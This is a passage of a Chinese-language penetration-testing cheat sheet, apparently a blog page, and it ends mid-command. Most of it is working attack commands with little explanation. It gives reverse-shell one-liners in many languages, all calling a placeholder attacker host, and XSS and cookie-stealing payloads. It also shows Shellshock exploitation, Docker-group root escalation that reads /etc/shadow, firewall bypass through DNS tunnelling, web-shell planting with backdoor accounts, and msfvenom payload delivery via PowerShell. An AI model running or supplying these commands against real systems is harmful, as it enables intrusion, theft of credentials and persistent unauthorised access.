<h3 id="BASH-反弹-Shell"><a href="#BASH-反弹-Shell" class="headerlink" title="BASH 反弹 Shell"></a>BASH 反弹 Shell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/X.X.X.X/443 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">exec /bin/bash 0&amp;0 2&gt;&amp;0</span><br><span class="line">exec /bin/bash 0&amp;0 2&gt;&amp;0</span><br><span class="line"></span><br><span class="line">0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br><span class="line"></span><br><span class="line">0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br><span class="line"></span><br><span class="line">exec 5&lt;&gt;/dev/tcp/attackerip/4444 cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done # or: while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done</span><br><span class="line">exec 5&lt;&gt;/dev/tcp/attackerip/4444</span><br><span class="line"></span><br><span class="line">cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done # or:</span><br><span class="line">while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done</span><br><span class="line"></span><br><span class="line">/bin/bash -i &gt; /dev/tcp/attackerip/8080 0&lt;&amp;1 2&gt;&amp;1</span><br><span class="line">/bin/bash -i &gt; /dev/tcp/X.X.X.X/443 0&lt;&amp;1 2&gt;&amp;1</span><br></pre></td></tr></table></figure>

<h3 id="PERL-反弹-Shell"><a href="#PERL-反弹-Shell" class="headerlink" title="PERL 反弹 Shell"></a>PERL 反弹 Shell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">perl -MIO -e &#x27;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;attackerip:443&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span><br><span class="line"></span><br><span class="line"># Win 平台</span><br><span class="line">perl -MIO -e &#x27;$c=new IO::Socket::INET(PeerAddr,&quot;attackerip:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span><br><span class="line">perl -e &#x27;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;’</span><br></pre></td></tr></table></figure>

<h3 id="RUBY-反弹-Shell"><a href="#RUBY-反弹-Shell" class="headerlink" title="RUBY 反弹 Shell"></a>RUBY 反弹 Shell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e &#x27;exit if fork;c=TCPSocket.new(&quot;attackerip&quot;,&quot;443&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span><br><span class="line"></span><br><span class="line"># Win 平台</span><br><span class="line">ruby -rsocket -e &#x27;c=TCPSocket.new(&quot;attackerip&quot;,&quot;443&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span><br><span class="line">ruby -rsocket -e &#x27;f=TCPSocket.open(&quot;attackerip&quot;,&quot;443&quot;).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="PYTHON-反弹-Shell"><a href="#PYTHON-反弹-Shell" class="headerlink" title="PYTHON 反弹 Shell"></a>PYTHON 反弹 Shell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;attackerip&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="PHP-反弹-Shell"><a href="#PHP-反弹-Shell" class="headerlink" title="PHP 反弹 Shell"></a>PHP 反弹 Shell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;attackerip&quot;,443);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="JAVA-反弹-Shell"><a href="#JAVA-反弹-Shell" class="headerlink" title="JAVA 反弹 Shell"></a>JAVA 反弹 Shell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/attackerip/443;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>

<h3 id="NETCAT-反弹-Shell"><a href="#NETCAT-反弹-Shell" class="headerlink" title="NETCAT 反弹 Shell"></a>NETCAT 反弹 Shell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh attackerip 4444</span><br><span class="line">nc -e /bin/sh 192.168.37.10 443</span><br><span class="line"></span><br><span class="line"># 如果 -e 参数被禁用，可以尝试以下命令</span><br><span class="line"># mknod backpipe p &amp;&amp; nc attackerip 443 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br><span class="line">/bin/sh | nc attackerip 443</span><br><span class="line">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc attackerip 4443 0/tmp/</span><br><span class="line"></span><br><span class="line"># 如果你安装错了 netcat 的版本，请尝试以下命令</span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc attackerip &gt;/tmp/f</span><br></pre></td></tr></table></figure>

<h3 id="TELNET-反弹-Shell"><a href="#TELNET-反弹-Shell" class="headerlink" title="TELNET 反弹 Shell"></a>TELNET 反弹 Shell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 如果 netcat 不可用或者 /dev/tcp</span><br><span class="line">mknod backpipe p &amp;&amp; telnet attackerip 443 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br></pre></td></tr></table></figure>

<h3 id="XTERM-反弹-Shell"><a href="#XTERM-反弹-Shell" class="headerlink" title="XTERM 反弹 Shell"></a>XTERM 反弹 Shell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># http://baike.baidu.com/view/418628.htm</span><br><span class="line"># 开启 X 服务器 (:1 – 监听 TCP 端口 6001)</span><br><span class="line">apt-get install xnest</span><br><span class="line">Xnest :1</span><br><span class="line"></span><br><span class="line"># 记得授权来自目标 IP 的连接</span><br><span class="line">xterm -display 127.0.0.1:1</span><br><span class="line"></span><br><span class="line"># 授权访问</span><br><span class="line">xhost +targetip</span><br><span class="line"></span><br><span class="line"># 在目标机器上连接回我们的 X 服务器</span><br><span class="line">xterm -display attackerip:1</span><br><span class="line">/usr/openwin/bin/xterm -display attackerip:1</span><br><span class="line">or</span><br><span class="line">$ DISPLAY=attackerip:0 xterm</span><br></pre></td></tr></table></figure>

<h3 id="XSS-备忘录"><a href="#XSS-备忘录" class="headerlink" title="XSS 备忘录"></a>XSS 备忘录</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</span><br><span class="line">(&quot;&lt; iframes &gt; src=http://IP:PORT &lt;/ iframes &gt;&quot;)</span><br><span class="line"></span><br><span class="line">&lt;script&gt;document.location=http://IP:PORT&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&#x27;;alert(String.fromCharCode(88,83,83))//\&#x27;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83))//–&gt;&lt;/SCRIPT&gt;&quot;&gt;&#x27;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">&quot;;!–&quot;&lt;XSS&gt;=&amp;amp;amp;&#123;()&#125;</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">&lt;IMG SRC=javascript:alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&quot;&gt;</span><br><span class="line">&lt;IMG SRC=&amp;amp;amp;#106;&amp;amp;amp;#97;&amp;amp;amp;#118;&amp;amp;amp;#97;&amp;amp;amp;#115;&amp;amp;amp;#99;&amp;amp;amp;#114;&amp;amp;amp;#105;&amp;amp;amp;#112;&amp;amp;amp;#116;&amp;amp;amp;#58;&amp;amp;amp;#97;&amp;amp;amp;#108;&amp;amp;amp;#101;&amp;amp;amp;#114;&amp;amp;amp;#116;&amp;amp;amp;#40;&amp;amp;amp;#39;&amp;amp;amp;#88;&amp;amp;amp;#83;&amp;amp;amp;#83;&amp;amp;amp;#39;&amp;amp;amp;#41;&gt;</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=&amp;amp;amp;#0000106&amp;amp;amp;#0000097&amp;amp;amp;#0000118&amp;amp;amp;#0000097&amp;amp;amp;#0000115&amp;amp;amp;#0000099&amp;amp;amp;#0000114&amp;amp;amp;#0000105&amp;amp;amp;#0000112&amp;amp;amp;#0000116&amp;amp;amp;#0000058&amp;amp;amp;#0000097&amp;amp;amp;#0000108&amp;amp;amp;#0000101&amp;amp;amp;#0000114&amp;amp;amp;#0000116&amp;amp;amp;#0000040&amp;amp;amp;#0000039&amp;amp;amp;#0000088&amp;amp;amp;#0000083&amp;amp;amp;#0000083&amp;amp;amp;#0000039&amp;amp;amp;#0000041&gt;</span><br><span class="line">&lt;IMG SRC=&quot;jav ascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line"></span><br><span class="line">perl -e &#x27;print &quot;&lt;IMG SRC=javascript:alert(\&quot;XSS\&quot;)&gt;&quot;;&#x27; &gt; out</span><br><span class="line"></span><br><span class="line">&lt;BODY onload!#$%&amp;amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;</span><br><span class="line"></span><br><span class="line">(&quot;&gt;&lt; iframes http://google.com &lt; iframes &gt;)</span><br><span class="line"></span><br><span class="line">&lt;BODY BACKGROUND=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line">&lt;FRAMESET&gt;&lt;FRAME SRC=”javascript:alert(&#x27;XSS&#x27;);&quot;&gt;&lt;/FRAMESET&gt;</span><br><span class="line">&quot;&gt;&lt;script &gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line">%253cscript%253ealert(document.cookie)%253c/script%253e</span><br><span class="line">&quot;&gt;&lt;s&quot;%2b&quot;cript&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line">%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)&#x27;%3E</span><br><span class="line">&lt;img src=asdf onerror=alert(document.cookie)&gt;</span><br></pre></td></tr></table></figure>

<h3 id="SSH-Over-SCTP-使用-Socat"><a href="#SSH-Over-SCTP-使用-Socat" class="headerlink" title="SSH Over SCTP (使用 Socat)"></a>SSH Over SCTP (使用 Socat)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 远端服务器</span><br><span class="line"># 假设你准备让 SCTP socket 监听端口 80/SCTP 并且 sshd 端口在 22/TCP</span><br><span class="line">$ socat SCTP-LISTEN:80,fork TCP:localhost:22</span><br><span class="line"></span><br><span class="line"># 本地端</span><br><span class="line"># 将 SERVER_IP 换成远端服务器的地址，然后将 80 换成 SCTP 监听的端口号</span><br><span class="line">$ socat TCP-LISTEN:1337,fork SCTP:SERVER_IP:80</span><br><span class="line"></span><br><span class="line"># 创建 socks 代理</span><br><span class="line"># 替换 username 和 -p 的端口号</span><br><span class="line">$ ssh -lusername localhost -D 8080 -p 1337</span><br></pre></td></tr></table></figure>

<p>使用洋葱网络</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 安装服务</span><br><span class="line">$ apt-get install tor torsocks</span><br><span class="line"></span><br><span class="line"># 绑定 ssh 到 tor 服务端口 80</span><br><span class="line"># /etc/tor/torrc</span><br><span class="line">SocksPolicy accept 127.0.0.1</span><br><span class="line">SocksPolicy accept 192.168.0.0/16</span><br><span class="line">Log notice file /var/log/tor/notices.log</span><br><span class="line">RunAsDaemon 1</span><br><span class="line">HiddenServiceDir /var/lib/tor/ssh_hidden_service/</span><br><span class="line">HiddenServicePort 80 127.0.0.1:22</span><br><span class="line">PublishServerDescriptor 0</span><br><span class="line">$ /etc/init.d/tor start</span><br><span class="line">$ cat /var/lib/tor/ssh_hidden_service/hostname</span><br><span class="line">3l5zstvt1zk5jhl662.onion</span><br><span class="line"></span><br><span class="line"># ssh 客户端连接</span><br><span class="line">$ apt-get install torsocks</span><br><span class="line">$ torsocks ssh login@3l5zstvt1zk5jhl662.onion -p 80</span><br></pre></td></tr></table></figure>

<h3 id="Metagoofil-–-元数据收集工具"><a href="#Metagoofil-–-元数据收集工具" class="headerlink" title="Metagoofil – 元数据收集工具"></a>Metagoofil – 元数据收集工具</h3><p>注：Metagoofil 是一款利用Google收集信息的工具。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># http://www.edge-security.com/metagoofil.php</span><br><span class="line"># 它可以自动在搜素引擎中检索和分析文件，还具有提供Mac地址，用户名列表等其他功能</span><br><span class="line">$ python metagoofil.py -d example.com -t doc,pdf -l 200 -n 50 -o examplefiles -f results.html</span><br></pre></td></tr></table></figure>

<h3 id="利用-Shellshock"><a href="#利用-Shellshock" class="headerlink" title="利用 Shellshock"></a>利用 Shellshock</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 一个发现并利用服务器 Shellshock 的工具</span><br><span class="line"># https://github.com/nccgroup/shocker</span><br><span class="line">$ ./shocker.py -H 192.168.56.118  --command &quot;/bin/cat /etc/passwd&quot; -c /cgi-bin/status --verbose</span><br><span class="line"></span><br><span class="line"># 查看文件</span><br><span class="line">$ echo -e &quot;HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () &#123; :;&#125;; echo \$(&lt;/etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n&quot; | nc 192.168.56.118 80</span><br><span class="line"></span><br><span class="line"># 绑定 shell</span><br><span class="line">$ echo -e &quot;HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () &#123; :;&#125;; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n&quot; | nc 192.168.56.118 80</span><br><span class="line"></span><br><span class="line"># 反弹 Shell</span><br><span class="line">$ nc -l -p 443</span><br><span class="line">$ echo &quot;HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () &#123; :;&#125;; /usr/bin/nc 192.168.56.103 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n&quot; | nc 192.168.56.118 80</span><br></pre></td></tr></table></figure>

<h3 id="获取-Docker-的-Root"><a href="#获取-Docker-的-Root" class="headerlink" title="获取 Docker 的 Root"></a>获取 Docker 的 Root</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"># 获取  Docker 的 Root</span><br><span class="line"># user 必须在 docker 用户组中</span><br><span class="line">ek@victum:~/docker-test$ id</span><br><span class="line">uid=1001(ek) gid=1001(ek) groups=1001(ek),114(docker)</span><br><span class="line"></span><br><span class="line">ek@victum:~$ mkdir docker-test</span><br><span class="line">ek@victum:~$ cd docker-test</span><br><span class="line"></span><br><span class="line">ek@victum:~$ cat &gt; Dockerfile</span><br><span class="line">FROM debian:wheezy</span><br><span class="line"></span><br><span class="line">ENV WORKDIR /stuff</span><br><span class="line"></span><br><span class="line">RUN mkdir -p $WORKDIR</span><br><span class="line"></span><br><span class="line">VOLUME [ $WORKDIR ]</span><br><span class="line"></span><br><span class="line">WORKDIR $WORKDIR</span><br><span class="line">&lt;&lt; EOF</span><br><span class="line"></span><br><span class="line">ek@victum:~$ docker build -t my-docker-image .</span><br><span class="line">ek@victum:~$ docker run -v $PWD:/stuff -t my-docker-image /bin/sh -c \</span><br><span class="line">&#x27;cp /bin/sh /stuff &amp;&amp; chown root.root /stuff/sh &amp;&amp; chmod a+s /stuff/sh&#x27;</span><br><span class="line">./sh</span><br><span class="line">whoami</span><br><span class="line"># root</span><br><span class="line"></span><br><span class="line">ek@victum:~$ docker run -v /etc:/stuff -t my-docker-image /bin/sh -c &#x27;cat /stuff/shadow&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="使用-DNS-隧道绕过防火墙"><a href="#使用-DNS-隧道绕过防火墙" class="headerlink" title="使用 DNS 隧道绕过防火墙"></a>使用 DNS 隧道绕过防火墙</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 让数据和命令使用 DNS 隧道传输以绕过防火墙的检查</span><br><span class="line"># dnscat2 支持从目标主机上面上传和下载命令来获取文件、数据和程序</span><br><span class="line"></span><br><span class="line"># 服务器 (攻击者)</span><br><span class="line">$ apt-get update</span><br><span class="line">$ apt-get -y install ruby-dev git make g++</span><br><span class="line">$ gem install bundler</span><br><span class="line">$ git clone https://github.com/iagox86/dnscat2.git</span><br><span class="line">$ cd dnscat2/server</span><br><span class="line">$ bundle install</span><br><span class="line">$ ruby ./dnscat2.rb</span><br><span class="line">dnscat2&gt; New session established: 16059</span><br><span class="line">dnscat2&gt; session -i 16059</span><br><span class="line"></span><br><span class="line"># 客户机 (目标)</span><br><span class="line"># https://downloads.skullsecurity.org/dnscat2/</span><br><span class="line"># https://github.com/lukebaggett/dnscat2-powershell</span><br><span class="line">$ dnscat --host &lt;dnscat server_ip&gt;</span><br></pre></td></tr></table></figure>

<h3 id="编译-Assemble-代码"><a href="#编译-Assemble-代码" class="headerlink" title="编译 Assemble 代码"></a>编译 Assemble 代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ nasm -f elf32 simple32.asm -o simple32.o</span><br><span class="line">$ ld -m elf_i386 simple32.o simple32</span><br><span class="line"></span><br><span class="line">$ nasm -f elf64 simple.asm -o simple.o</span><br><span class="line">$ ld simple.o -o simple</span><br></pre></td></tr></table></figure>

<h3 id="使用非交互-Shell-打入内网"><a href="#使用非交互-Shell-打入内网" class="headerlink" title="使用非交互 Shell 打入内网"></a>使用非交互 Shell 打入内网</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 生成 shell 使用的 ssh 密钥</span><br><span class="line">$ wget -O - -q &quot;http://domain.tk/sh.php?cmd=whoami&quot;</span><br><span class="line">$ wget -O - -q &quot;http://domain.tk/sh.php?cmd=ssh-keygen -f /tmp/id_rsa -N \&quot;\&quot; &quot;</span><br><span class="line">$ wget -O - -q &quot;http://domain.tk/sh.php?cmd=cat /tmp/id_rsa&quot;</span><br><span class="line"></span><br><span class="line"># 增加用户 tempuser </span><br><span class="line">$ useradd -m tempuser</span><br><span class="line">$ mkdir /home/tempuser/.ssh &amp;&amp; chmod 700 /home/tempuser/.ssh</span><br><span class="line">$ wget -O - -q &quot;http://domain.tk/sh.php?cmd=cat /tmp/id_rsa&quot; &gt; /home/tempuser/.ssh/authorized_keys</span><br><span class="line">$ chmod 700 /home/tempuser/.ssh/authorized_keys</span><br><span class="line">$ chown -R tempuser:tempuser /home/tempuser/.ssh</span><br><span class="line"></span><br><span class="line"># 反弹 ssh shell</span><br><span class="line">$ wget -O - -q &quot;http://domain.tk/sh.php?cmd=ssh -i /tmp/id_rsa -o StrictHostKeyChecking=no -R 127.0.0.1:8080:192.168.20.13:8080 -N -f tempuser@&lt;attacker_ip&gt;&quot;</span><br></pre></td></tr></table></figure>

<h3 id="利用-POST-远程命令执行获取-Shell"><a href="#利用-POST-远程命令执行获取-Shell" class="headerlink" title="利用 POST 远程命令执行获取 Shell"></a>利用 POST 远程命令执行获取 Shell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">attacker:~$ curl -i -s -k  -X &#x27;POST&#x27; --data-binary $&#x27;IP=%3Bwhoami&amp;submit=submit&#x27; &#x27;http://victum.tk/command.php&#x27;</span><br><span class="line"></span><br><span class="line">attacker:~$ curl -i -s -k  -X &#x27;POST&#x27; --data-binary $&#x27;IP=%3Becho+%27%3C%3Fphp+system%28%24_GET%5B%22cmd%22%5D%29%3B+%3F%3E%27+%3E+..%2Fshell.php&amp;submit=submit&#x27; &#x27;http://victum.tk/command.php&#x27;</span><br><span class="line"></span><br><span class="line">attacker:~$ curl http://victum.tk/shell.php?cmd=id</span><br><span class="line"></span><br><span class="line"># 在服务器上下载 shell (phpshell.php)</span><br><span class="line"></span><br><span class="line">http://victum.tk/shell.php?cmd=php%20-r%20%27file_put_contents%28%22phpshell.php%22,%20fopen%28%22http://attacker.tk/phpshell.txt%22,%20%27r%27%29%29;%27</span><br><span class="line"></span><br><span class="line"># 运行 nc 并执行 phpshell.php</span><br><span class="line">attacker:~$ nc -nvlp 1337</span><br></pre></td></tr></table></figure>

<h3 id="以管理员身份在-Win7-上反弹具有系统权限的-Shell"><a href="#以管理员身份在-Win7-上反弹具有系统权限的-Shell" class="headerlink" title="以管理员身份在 Win7 上反弹具有系统权限的 Shell"></a>以管理员身份在 Win7 上反弹具有系统权限的 Shell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">msfvenom –p windows/shell_reverse_tcp LHOST=192.168.56.102 –f exe &gt; danger.exe</span><br><span class="line"></span><br><span class="line"># 显示账户配置</span><br><span class="line">net user &lt;login&gt;</span><br><span class="line"></span><br><span class="line"># Kali 上下载 psexec</span><br><span class="line"></span><br><span class="line">https://technet.microsoft.com/en-us/sysinternals/bb897553.aspx</span><br><span class="line"></span><br><span class="line"># 使用 powershell 脚本上传 psexec.exe 到目标机器</span><br><span class="line">echo $client = New-Object System.Net.WebClient &gt; script.ps1</span><br><span class="line">echo $targetlocation = &quot;http://192.168.56.102/PsExec.exe&quot; &gt;&gt; script.ps1</span><br><span class="line">echo $client.DownloadFile($targetlocation,&quot;psexec.exe&quot;) &gt;&gt; script.ps1</span><br><span class="line">powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script.ps1</span><br><span class="line"></span><br><span class="line"># 使用 powershell 脚本上传 danger.exe 到目标机器</span><br><span class="line">echo $client = New-Object System.Net.WebClient &gt; script2.ps1</span><br><span class="line">echo $targetlocation = &quot;http://192.168.56.102/danger.exe&quot; &gt;&gt; script2.ps1</span><br><span class="line">echo $client.DownloadFile($targetlocation,&quot;danger.exe&quot;) &gt;&gt; script2.ps1</span><br><span class="line">powershell.exe -ExecutionPolicy Bypass 